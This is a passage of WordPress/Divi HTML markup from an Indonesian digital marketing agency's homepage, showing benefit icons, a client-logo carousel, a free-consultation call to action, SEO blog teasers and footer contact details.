+<p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" width="100" height="100" alt="Biaya Lebih efektif icon" class="wp-image-4091 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2021/11/babi.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2021/11/babi.png" width="100" height="100" alt="Biaya Lebih efektif icon" class="wp-image-4091 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" /></noscript></p></div>
+			</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_7  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_accordion et_pb_accordion_1">
+				
+				
+				
+				
+				<div class="et_pb_toggle et_pb_module et_pb_accordion_item et_pb_accordion_item_1 et_pb_section_video_on_hover  et_pb_toggle_open">
+				
+				
+				
+				
+				<h2 class="et_pb_toggle_title"></h2>
+				<div class="et_pb_toggle_content clearfix"><p style="text-align: center;">Terhubung dengan Konsumen</p>
+<p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" width="100" height="100" alt="terhubung icon" class="wp-image-4083 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2021/11/terhubung-2-1.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2021/11/terhubung-2-1.png" width="100" height="100" alt="terhubung icon" class="wp-image-4083 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" /></noscript></p></div>
+			</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_8  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_accordion et_pb_accordion_2">
+				
+				
+				
+				
+				<div class="et_pb_toggle et_pb_module et_pb_accordion_item et_pb_accordion_item_2 et_pb_section_video_on_hover  et_pb_toggle_open">
+				
+				
+				
+				
+				<h2 class="et_pb_toggle_title"></h2>
+				<div class="et_pb_toggle_content clearfix"><p style="text-align: center;">Lebih Mengenal Konsumen</p>
+<p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" width="100" height="100" alt="lacak icon" class="wp-image-4093 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2021/11/lacak-2.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2021/11/lacak-2.png" width="100" height="100" alt="lacak icon" class="wp-image-4093 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" /></noscript></p></div>
+			</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_9  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_accordion et_pb_accordion_3">
+				
+				
+				
+				
+				<div class="et_pb_toggle et_pb_module et_pb_accordion_item et_pb_accordion_item_3 et_pb_section_video_on_hover  et_pb_toggle_open">
+				
+				
+				
+				
+				<h2 class="et_pb_toggle_title"></h2>
+				<div class="et_pb_toggle_content clearfix"><p style="text-align: center;">Dapat Kepercayaan Konsumen</p>
+<p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" width="100" height="100" alt="konsumen percaya icon" class="wp-image-4092 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2021/11/konsumen-percaya-2.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2021/11/konsumen-percaya-2.png" width="100" height="100" alt="konsumen percaya icon" class="wp-image-4092 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" /></noscript></p></div>
+			</div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_4 et_animated et_pb_equal_columns et_pb_gutters2">
+				<div class="et_pb_column et_pb_column_1_4 et_pb_column_10  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_accordion et_pb_accordion_4">
+				
+				
+				
+				
+				<div class="et_pb_toggle et_pb_module et_pb_accordion_item et_pb_accordion_item_4 et_pb_section_video_on_hover  et_pb_toggle_open">
+				
+				
+				
+				
+				<h2 class="et_pb_toggle_title"></h2>
+				<div class="et_pb_toggle_content clearfix"><p style="text-align: center;">Memperluas Target Pasar</p>
+<p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" width="100" height="100" alt="memperluas pasar icon" class="wp-image-4090 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2021/11/luas-pasar-2.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2021/11/luas-pasar-2.png" width="100" height="100" alt="memperluas pasar icon" class="wp-image-4090 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" /></noscript></p></div>
+			</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_11  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_accordion et_pb_accordion_5">
+				
+				
+				
+				
+				<div class="et_pb_toggle et_pb_module et_pb_accordion_item et_pb_accordion_item_5 et_pb_section_video_on_hover  et_pb_toggle_open">
+				
+				
+				
+				
+				<h2 class="et_pb_toggle_title"></h2>
+				<div class="et_pb_toggle_content clearfix"><p style="text-align: center;">Meningkatkan Penjualan</p>
+<p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" width="100" height="100" alt="penjualan meningkat icon" class="wp-image-4088 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2021/11/penjualan-meningkat-2.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2021/11/penjualan-meningkat-2.png" width="100" height="100" alt="penjualan meningkat icon" class="wp-image-4088 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" /></noscript></p></div>
+			</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_12  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_accordion et_pb_accordion_6">
+				
+				
+				
+				
+				<div class="et_pb_toggle et_pb_module et_pb_accordion_item et_pb_accordion_item_6 et_pb_section_video_on_hover  et_pb_toggle_open">
+				
+				
+				
+				
+				<h2 class="et_pb_toggle_title"></h2>
+				<div class="et_pb_toggle_content clearfix"><p style="text-align: center;">Investasi Jangka Panjang</p>
+<p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" width="100" height="100" alt="investasi icon" class="wp-image-4094 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2021/11/investasi-2.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2021/11/investasi-2.png" width="100" height="100" alt="investasi icon" class="wp-image-4094 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" /></noscript></p></div>
+			</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_13  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_accordion et_pb_accordion_7">
+				
+				
+				
+				
+				<div class="et_pb_toggle et_pb_module et_pb_accordion_item et_pb_accordion_item_7 et_pb_section_video_on_hover  et_pb_toggle_open">
+				
+				
+				
+				
+				<h2 class="et_pb_toggle_title"></h2>
+				<div class="et_pb_toggle_content clearfix"><p style="text-align: center;">Meningkatkan Daya Saing</p>
+<p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" width="100" height="100" alt="Daya saing icon" class="wp-image-4089 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2021/11/mempermudah-2.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2021/11/mempermudah-2.png" width="100" height="100" alt="Daya saing icon" class="wp-image-4089 alignnone size-full" style="display: block; margin-left: auto; margin-right: auto;" /></noscript></p></div>
+			</div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_5">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_14  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_4  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><h2 style="text-align: center;">Our Clients</h2></div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				<div class="et_pb_bottom_inside_divider et-no-transition"></div>
+			</div><div class="et_pb_section et_pb_section_3 et_section_regular section_has_divider et_pb_bottom_divider et_pb_top_divider" >
+				<div class="et_pb_top_inside_divider et-no-transition"></div>
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_6 et_pb_equal_columns et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_15  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_5  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><div class="wpcp-carousel-wrapper wpcp-wrapper-4102">
+	<div id="wpcp-preloader-4102" class="wpcp-carousel-preloader"><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="Preloader Image" data-lazy-src="https://dotnextdigital.com/wp-content/plugins/wp-carousel-free/public/css/spinner.svg" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/plugins/wp-carousel-free/public/css/spinner.svg" alt="Preloader Image" /></noscript></div>	<div class="wpcp-carousel-content-wrapper">
+	<div id="sp-wp-carousel-free-id-4102" class="wpcp-carousel-section sp-wpcp-4102  nav-vertical-center wpcp-image-carousel wpcp-preloader wpcp-standard" data-swiper='{ &quot;accessibility&quot;:true, &quot;spaceBetween&quot;:20, &quot;arrows&quot;:true, &quot;freeMode&quot;: false, &quot;autoplay&quot;:true, &quot;effect&quot;: &quot;&quot;, &quot;centerMode&quot;: false, &quot;autoplaySpeed&quot;:3000, &quot;dots&quot;:false, &quot;infinite&quot;:true, &quot;speed&quot;:600, &quot;pauseOnHover&quot;:true,
+			&quot;slidesToShow&quot;:{&quot;lg_desktop&quot;:4, &quot;desktop&quot;: 4, &quot;laptop&quot;: 3, &quot;tablet&quot;: 2, &quot;mobile&quot;: 1}, &quot;responsive&quot;:{&quot;desktop&quot;:1200, &quot;laptop&quot;: 980, &quot;tablet&quot;: 736, &quot;mobile&quot;: 480}, &quot;rtl&quot;:false, &quot;lazyLoad&quot;: &quot;false&quot;, &quot;swipe&quot;: true, &quot;draggable&quot;: true, &quot;swipeToSlide&quot;:false }' dir="ltr">
+		<div class="swiper-wrapper">
+		<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/shafana-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/tosca-2.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/saudagar-2.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/nicol-2.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/jungle-2-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/ids-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/ichitan-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/dwimanunggal-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/hh-2.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/climatherm-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/climatron-2.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/blnk-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/bci-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/azhar.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/11/afc-2-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/12/pkn-1.png" alt="Digital marketing" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2021/12/forground.png" alt="forground" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2023/05/Dextone.png" alt="Digital Marketing Jakarta" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2023/05/Seasons.jpg" alt="Seasons" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2023/05/Perfectio.jpg" alt="Perfectio" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2023/05/My-pets.jpg" alt="My pets" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2023/05/Magal-Indonesia.jpg" alt="Magal Indonesia" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2023/05/JJ.jpg" alt="JJ" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2023/05/Jagat-Ide.jpg" alt="Jagat Ide" width="200" height="100">	</div>
+		</div>
+</div>
+	<div class="swiper-slide">
+	<div class="wpcp-single-item">
+			<div class="wpcp-slide-image">
+		<img decoding="async" class="skip-lazy" src="https://dotnextdigital.com/wp-content/uploads/2023/05/Jagat-Ide.png" alt="Jagat Ide" width="200" height="100">	</div>
+		</div>
+</div>
+			</div>
+				<!-- If we need navigation buttons -->
+					<div class="wpcp-prev-button swiper-button-prev"><i class="fa fa-angle-left"></i></div>
+			<div class="wpcp-next-button swiper-button-next"><i class="fa fa-angle-right"></i></div>
+			</div>
+	</div>
+</div>
+</div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_4 et_section_regular section_has_divider et_pb_bottom_divider et_pb_top_divider" >
+				<div class="et_pb_top_inside_divider et-no-transition"></div>
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_7">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_16  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_6  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><h3 style="text-align: center;">Mulai Kerja Sama dengan Jasa Kami</h3></div>
+			</div><div class="et_pb_module et_pb_text et_pb_text_7  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: center;">Pertam, mereka yang telah mengalami sendiri kekuatan digital marketing menandai keberhasilan melalui penerapan strategi pemasaran kreatif dan berbasis data dari layanan kami. Kedua, dengan pendekatan ini, mereka berhasil memaksimalkan potensi pemasaran digital, membuktikan bahwa strategi yang kreatif dan didasarkan pada data dapat menjadi kunci kesuksesan dalam era digital ini.</p></div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_5 et_pb_with_background et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_9">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_17  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_8  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: center;">Bagaimana, apakah Anda masih ragu dengan kekuatan dari strategi digital marketing?</p>
+<p style="text-align: center;">Konsultasikan dengan kami terlebih dahulu agar Anda merasa yakin sebelum memulainya.</p></div>
+			</div><div class="et_pb_button_module_wrapper et_pb_button_0_wrapper et_pb_button_alignment_center et_pb_module ">
+				<a class="et_pb_button et_pb_button_0 et_pb_bg_layout_light" href="https://dotnextdigital.com/kontak/">Mulai Konsultasi Gratis</a>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_6 et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_10">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_18  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_9  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><h3 style="padding-left: 40px; text-align: center;">Tambah Pengetahuan Anda Tentang Dunia Digital Marketing</h3></div>
+			</div><div class="et_pb_with_border et_pb_module et_pb_blog_0 et_pb_blog_grid_wrapper et_pb_bg_layout_light">
+					<div class="et_pb_blog_grid clearfix ">
+					
+					
+					
+					
+					<div class="et_pb_ajax_pagination_container">
+						<div class="et_pb_salvattore_content" data-columns>
+			<article id="post-6423" class="et_pb_post clearfix et_pb_no_thumb et_pb_blog_item_0_0 post-6423 post type-post status-publish format-standard hentry category-branding category-digital-marketing category-digitas-ads category-facebook-ads">
+
+				
+														<h2 class="entry-title">
+													<a href="https://dotnextdigital.com/mengoptimalkan-pengalaman-pengguna/">Pengalaman Pengguna untuk Pencarian Lokal di Jakarta</a>
+											</h2>
+				
+					<p class="post-meta">oleh <span class="author vcard"><a href="https://dotnextdigital.com/author/admin_dotnext/" title="Postingan oleh Admin_Dotnext" rel="author">Admin_Dotnext</a></span> | <span class="published">Sep 24, 2024</span></p><div class="post-content"><div class="post-content-inner"><p>Mengoptimalkan Pengalaman Pengguna untuk Pencarian Lokal di Jakarta Pengalaman Pengguna - Dalam era digital saat ini, pencarian lokal menjadi semakin dominan. Di Jakarta yang dinamis, memastikan pengalaman pengguna yang baik dalam pencarian lokal dapat membuat...</p>
+</div></div>			
+			</article>
+				
+			<article id="post-10702" class="et_pb_post clearfix et_pb_blog_item_0_1 post-10702 post type-post status-publish format-standard has-post-thumbnail hentry category-jasa-seo tag-jasa-seo tag-jasa-seo-bali">
+
+				<div class="et_pb_image_container"><a href="https://dotnextdigital.com/jasa-seo-off-page-yang-relevan/" class="entry-featured-image-url"><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20400%20250'%3E%3C/svg%3E" alt="Jasa SEO Off Page Yang Relevan" class="" data-lazy-srcset="https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Off-Page.webp 479w, https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Off-Page-400x250.webp 480w " data-lazy-sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Off-Page-400x250.webp" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Off-Page-400x250.webp" alt="Jasa SEO Off Page Yang Relevan" class="" srcset="https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Off-Page.webp 479w, https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Off-Page-400x250.webp 480w " sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></noscript></a></div>
+														<h2 class="entry-title">
+													<a href="https://dotnextdigital.com/jasa-seo-off-page-yang-relevan/">Jasa SEO Off Page Yang Relevan</a>
+											</h2>
+				
+					<p class="post-meta">oleh <span class="author vcard"><a href="https://dotnextdigital.com/author/tiarahapsah/" title="Postingan oleh Tiara Hasna Sal Sabila S.Kom" rel="author">Tiara Hasna Sal Sabila S.Kom</a></span> | <span class="published">Agu 2, 2024</span></p><div class="post-content"><div class="post-content-inner"><p>Jasa SEO Off Page Boost Peringkat Website Kamu Hey, guys! Ketemu lagi di sesi kita kali ini, di mana kita akan ngebahas salah satu aspek penting dalam dunia SEO yang sering banget bikin pusing: Off Page SEO. Jadi gini, buat kalian yang baru terjun ke dunia digital...</p>
+</div></div>			
+			</article>
+				
+			<article id="post-10699" class="et_pb_post clearfix et_pb_blog_item_0_2 post-10699 post type-post status-publish format-standard has-post-thumbnail hentry category-jasa-seo tag-jasa-seo tag-jasa-seo-bekasi">
+
+				<div class="et_pb_image_container"><a href="https://dotnextdigital.com/jasa-seo-bekasi-website-di-halaman-1-google/" class="entry-featured-image-url"><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20400%20250'%3E%3C/svg%3E" alt="Jasa SEO Bekasi Website Di Halaman 1 Google" class="" data-lazy-srcset="https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Bekasi.webp 479w, https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Bekasi-400x250.webp 480w " data-lazy-sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Bekasi-400x250.webp" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Bekasi-400x250.webp" alt="Jasa SEO Bekasi Website Di Halaman 1 Google" class="" srcset="https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Bekasi.webp 479w, https://dotnextdigital.com/wp-content/uploads/2024/08/jasa-SEO-Bekasi-400x250.webp 480w " sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></noscript></a></div>
+														<h2 class="entry-title">
+													<a href="https://dotnextdigital.com/jasa-seo-bekasi-website-di-halaman-1-google/">Jasa SEO Bekasi Website Di Halaman 1 Google</a>
+											</h2>
+				
+					<p class="post-meta">oleh <span class="author vcard"><a href="https://dotnextdigital.com/author/tiarahapsah/" title="Postingan oleh Tiara Hasna Sal Sabila S.Kom" rel="author">Tiara Hasna Sal Sabila S.Kom</a></span> | <span class="published">Agu 2, 2024</span></p><div class="post-content"><div class="post-content-inner"><p>Jasa SEO Bali Melesatkan Traffic Website Oke, guys! Kali ini kita bakal ngomongin topik yang mungkin udah sering kalian denger tapi masih bingung cara mainnya. Yup, SEO atau Search Engine Optimization. Gimana caranya bikin website kita nongol di halaman pertama...</p>
+</div></div>			
+			</article>
+				</div><div><div class="pagination clearfix">
+	<div class="alignleft"><a href="https://dotnextdigital.com/page/2/?et_blog" >&laquo; Entri Terdahulu</a></div>
+	<div class="alignright"></div>
+</div></div></div>
+					</div>
+					 
+				</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_7 et_pb_with_background et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_11 et_pb_gutters2">
+				<div class="et_pb_column et_pb_column_1_4 et_pb_column_19  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_10  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20184%2046'%3E%3C/svg%3E" width="184" height="46" alt="footer" class="wp-image-31 alignnone size-medium" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2020/01/Dotnext-logo-300x75.png" /><noscript><img decoding="async" src="https://dotnextdigital.com/wp-content/uploads/2020/01/Dotnext-logo-300x75.png" width="184" height="46" alt="footer" class="wp-image-31 alignnone size-medium" /></noscript></p>
+<p style="text-align: justify;">As a digital agency company, we focus on high-level strategies and cutting-edge marketing tactics to leverage the power of online in branding our clients&#8217; products/services.</p></div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_20  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_11  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Contact US</p></div>
+			</div><div class="et_pb_module et_pb_divider et_pb_divider_0 et_pb_divider_position_ et_pb_space"><div class="et_pb_divider_internal"></div></div><div class="et_pb_module et_pb_text et_pb_text_12  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: justify;">Phone  :+6221 5080 5217</p>
+<p style="text-align: justify;">Hotline  :+6287777055000</p>
+<p style="text-align: justify;">Whatsapp :<span style="color: #ffffff;"><a href="https://api.whatsapp.com/send?phone=6281911055000&amp;text=Hallo%20Admin%20DOTNEXT%20Digital" style="color: #ffffff;" target="_blank" rel="noopener noreferrer">+6287777055000</a></span></p>
